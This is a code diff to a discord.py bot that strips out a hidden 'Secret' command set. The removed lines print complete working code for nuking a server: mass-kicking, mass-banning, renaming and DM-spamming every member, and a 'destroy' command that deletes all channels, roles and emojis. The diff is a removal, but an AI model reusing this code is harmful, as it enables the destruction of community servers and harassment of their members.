@@ -10,9 +10,6 @@ class MyClient(discord.Client):
     async def on_ready(self):
         print('Logged on as {0}!'.format(self.user))
 
-    async def on_message(self, message):
-        print('Message from {0.author}: {0.content}'.format(message))
-
 intents = discord.Intents(messages=True, guilds=True, members=True)
 # Imports the needed libs.
 
@@ -40,103 +37,10 @@ async def secret(ctx):
     )
 
     embed.set_author(name='Secret')
-    embed.add_field(name='Kall', value='Kicks every member in a server', inline=False)
-    embed.add_field(name='Ball', value='Bans every member in a server', inline=False)
-    embed.add_field(name='Rall', value='Renames every member in a server', inline=False)
-    embed.add_field(name='Mall', value='Messages every member in a server', inline=False)
-    embed.add_field(name='Destroy', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
     embed.add_field(name='Ping', value='Gives ping to client (expressed in MS)', inline=False)
     embed.add_field(name='Info', value='Gives information of a user', inline=False)
     await member.send(embed=embed)
 #############################
-
-####KALL COMMAND####
-@client.command(pass_context=True)
-async def kall(ctx):
-    await ctx.message.delete()
-    guild = ctx.message.guild
-    for member in list(client.get_all_members()):
-        try:
-            await guild.kick(member)
-            print (f"{member.name} has been kicked")
-        except:
-            print (f"{member.name} has FAILED to be kicked")
-        print ("Action completed: Kick all")
-#############################
-
-####BALL COMMAND####
-@client.command(pass_context=True)
-async def ball(ctx):
-    await ctx.message.delete()
-    guild = ctx.message.guild
-    for member in list(client.get_all_members()):
-        try:
-            await guild.ban(member)
-            print ("User " + member.name + " has been banned")
-        except:
-            pass
-    print ("Action completed: Ban all")
-#############################
-
-####RALL COMMAND####
-@client.command(pass_context=True)
-async def rall(ctx, rename_to):
-    await ctx.message.delete()
-    for member in list(client.get_all_members()):
-        try:
-            await member.edit(nick=rename_to)
-            print (f"{member.name} has been renamed to {rename_to}")
-        except:
-            print (f"{member.name} has NOT been renamed")
-        print("Action completed: Rename all")
-#############################
-
-####MALL COMMAND####
-@client.command(pass_context=True)
-async def mall(ctx):
-    await ctx.message.delete()
-    for member in list(client.get_all_members()):
-        await asyncio.sleep(0)
-        try:
-            await member.send("GET NUKED")
-        except:
-            pass
-        print("Action completed: Message all")
-#############################
-
-###DESTROY COMMAND####
-@client.command(pass_context=True)
-async def destroy(ctx):
-    await ctx.message.delete()
-    for channel in list(ctx.message.guild.channels):
-        try:
-            await channel.delete()
-            print (channel.name + " has been deleted")
-        except:
-            pass
-        guild = ctx.message.guild
-        channel = await guild.create_text_channel("Ez Clap")
-        await channel.send("GET NUKED")
-    for role in list(ctx.guild.roles):
-        try:
-            await role.delete()
-            print (f"{role.name} has been deleted")
-        except:
-            pass
-    for member in list(client.get_all_members()):
-        try:
-            await guild.ban(member)
-            print ("User " + member.name + " has been banned")
-        except:
-            pass
-    for emoji in list(ctx.guild.emojis):
-        try:
-            await emoji.delete()
-            print (f"{emoji.name} has been deleted")
-        except:
-            pass    
-    print("Action completed: Nuclear Destruction")
-# #############################
 
 
 ####PING COMMAND####
